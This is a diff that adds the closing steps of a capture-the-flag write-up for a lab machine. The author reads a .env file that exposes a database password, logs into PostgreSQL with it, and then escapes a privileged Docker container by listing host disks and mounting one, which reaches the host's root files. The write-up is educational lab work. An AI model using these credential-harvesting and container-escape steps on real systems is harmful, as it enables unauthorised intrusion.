@@ -376,3 +376,105 @@ uid=0(root) gid=0(root) groups=0(root)
 ### We are now `root`!
 
 > There's no root flag?
+
+There's an `.env` file at `/home/sparkles/app`, it reveals the following information:
+```console
+# cat .env
+cat .env
+DB_PORT=5432
+DB_HOST=postgres
+DB_USER=sparkles
+DB_PASSWORD=e6136cd757fb346df1bf08a3de5417191
+DB_NAME=wand_permit
+```
+
+Since the PostgreSQL service is exposed to us, I'll try to connect to it from my box.
+```console
+$ psql -h wandpermit.htb -U sparkles                                                                              
+Password for user sparkles: 
+psql (15.0 (Debian 15.0-1), server 15.1 (Debian 15.1-1.pgdg110+1))
+Type "help" for help.
+```
+
+But I couldn't find anything useful here.
+
+Since, we are in a docker, we should probably escape it somehow to gain further access.
+
+After googling for a while, it came up with [this](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounting-disk-poc1).
+
+The command `docker` was not available inside the docker container, so I tried others, until `fdisk` worked.
+
+> Well configured docker containers won't allow command like fdisk -l. However on miss-configured docker command where the flag --privileged or --device=/dev/sda1 with caps is specified, it is possible to get the privileges to see the host drive.
+
+```console
+# fdisk -l
+fdisk -l
+Disk /dev/sda: 8 GiB, 8589934592 bytes, 16777216 sectors
+Disk model: Virtual disk    
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: gpt
+Disk identifier: 41CE987E-9096-408E-A257-E218FB471DD7
+
+Device      Start      End  Sectors  Size Type
+/dev/sda1    2048     4095     2048    1M BIOS boot
+/dev/sda2    4096   528383   524288  256M Linux filesystem
+/dev/sda3  528384 16775167 16246784  7.8G Linux LVM
+
+
+Disk /dev/dm-0: 5.99 GiB, 6408896512 bytes, 12517376 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+
+
+Disk /dev/dm-1: 1 GiB, 1073741824 bytes, 2097152 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+```
+
+There are 2 additional drives available for us, `dm-0` and `dm-1`. So I tried to mount `dm-0` first to `/tmp/test`.
+
+```console
+# mkdir /tmp/test
+mkdir /tmp/test
+
+# mount /dev/dm-0 /tmp/test
+mount /dev/dm-0 /tmp/test
+```
+
+It didn't return an error, so I proceed to view the files in it.
+
+```console
+# ls -l /tmp/test
+ls -l /tmp/test
+total 76
+lrwxrwxrwx   1 root root     7 Aug  9 11:53 bin -> usr/bin
+drwxr-xr-x   2 root root  4096 Nov 22 22:25 boot
+drwxr-xr-x   4 root root  4096 Aug  9 11:56 dev
+drwxr-xr-x 107 root root  4096 Nov 29 13:41 etc
+drwxr-xr-x   3 root root  4096 Nov 23 23:34 home
+lrwxrwxrwx   1 root root     7 Aug  9 11:53 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Aug  9 11:53 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Aug  9 11:53 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Aug  9 11:53 libx32 -> usr/libx32
+drwx------   2 root root 16384 Nov 22 22:25 lost+found
+drwxr-xr-x   2 root root  4096 Aug  9 11:53 media
+drwxr-xr-x   2 root root  4096 Aug  9 11:53 mnt
+drwxr-xr-x   3 root root  4096 Nov 23 23:37 opt
+drwxr-xr-x   2 root root  4096 Apr 18  2022 proc
+drwx------   4 root root  4096 Nov 29 12:20 root
+drwxr-xr-x  13 root root  4096 Aug  9 11:58 run
+lrwxrwxrwx   1 root root     8 Aug  9 11:53 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Aug  9 11:53 srv
+drwxr-xr-x   2 root root  4096 Apr 18  2022 sys
+drwxrwxrwt  12 root root  4096 Dec  6 06:05 tmp
+drwxr-xr-x  14 root root  4096 Aug  9 11:53 usr
+drwxr-xr-x  12 root root  4096 Nov 22 22:37 var
+```
+
+It was actually another system's drive, and the ***root flag*** can be found at `/temp/test/root/root.txt`.
+
+I was about to explore more on the another drive `dm-1`, but after submitting the root flag, the challenge got terminated, and I cannot spawn the instance anymore.
